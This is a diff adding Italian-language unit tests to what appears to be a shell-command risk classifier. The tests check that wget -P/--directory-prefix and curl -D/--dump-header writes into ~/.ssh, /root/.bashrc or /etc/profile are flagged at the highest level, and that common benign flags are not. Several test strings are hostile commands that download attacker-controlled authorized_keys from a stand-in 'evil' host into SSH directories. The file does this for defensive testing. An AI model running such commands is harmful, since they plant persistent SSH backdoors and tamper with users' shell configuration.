@@ -312,15 +312,52 @@ test('livello 3 — curl/wget che scrivono un file di output a un percorso arbit
   }
 });
 
+test('livello 3 — wget che sceglie la CARTELLA di destinazione (-P/--directory-prefix)', () => {
+  // Verifier: `wget -P ~/.ssh http://evil/authorized_keys` scarica contenuto
+  // interamente scelto dall'attaccante (nome file dall'URL) dritto in una dir
+  // sensibile → stessa backdoor di -O, deve chiedere di digitare "conferma".
+  for (const cmd of [
+    'wget -P ~/.ssh http://esempio/authorized_keys',
+    'wget -P /home/utente/.ssh http://evil/authorized_keys',
+    'wget --directory-prefix=/home/utente/.ssh http://evil/authorized_keys',
+    'wget --directory-prefix /root/.ssh http://x',
+    'wget -P/tmp/boot http://x',               // -P attaccato al valore
+    'wget -rP /home/u/.ssh http://x',          // -P dentro un bundle di short-flag
+    'wget -e robots=off -P /root/.ssh http://x',
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (wget sceglie la cartella) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 3 — curl che scrive gli header su un file arbitrario (-D/--dump-header)', () => {
+  for (const cmd of [
+    'curl -D /home/user/.ssh/authorized_keys http://evil/x',
+    'curl --dump-header /root/.bashrc http://x',
+    'curl -sD /etc/profile http://x',          // -D dentro un bundle di short-flag
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (dump header su file) dovrebbe essere livello 3`);
+  }
+});
+
 test('livello 2 — curl/wget SENZA flag di output restano conferma-popup', () => {
   // curl senza -o stampa su stdout; wget nudo scrive al più nella cwd col nome
   // dell'URL: modifica recuperabile → livello 2 (nessuna regressione). I flag
   // comuni non di output (-s, -I, -L, -H, -X, -k, -j, -u…) non devono salire a 3.
+  // In particolare: la P/D minuscole e i flag simili NON devono far scattare i
+  // check nuovi (wget -p = --page-requisites, wget -np = --no-parent,
+  // curl -d = corpo POST, curl --data-*).
   for (const cmd of [
     'curl http://example.com', 'wget http://example.com/file',
     'curl -s http://x', 'curl -I http://x', 'curl -L http://x',
     'curl -X POST http://x', 'curl -k http://x', 'curl -j http://x',
     'curl -u user:pass http://x',
+    'curl -d name=mario http://x',             // -d minuscolo = corpo POST, non dump
+    'curl --data-binary @file http://x',
+    'curl -d @payload.json http://x',
+    'wget -p http://x',                        // -p minuscolo = --page-requisites (cwd)
+    'wget -np -r http://x/dir/',               // -np = --no-parent, nessuna dir arbitraria
+    'wget --no-parent http://x',
+    'wget --prefer-family=IPv4 http://x',      // contiene "prefer" ma non è directory-prefix
   ]) {
     assert.equal(lvl(cmd), 2, `"${cmd}" (nessun output-su-file) dovrebbe restare livello 2`);
   }
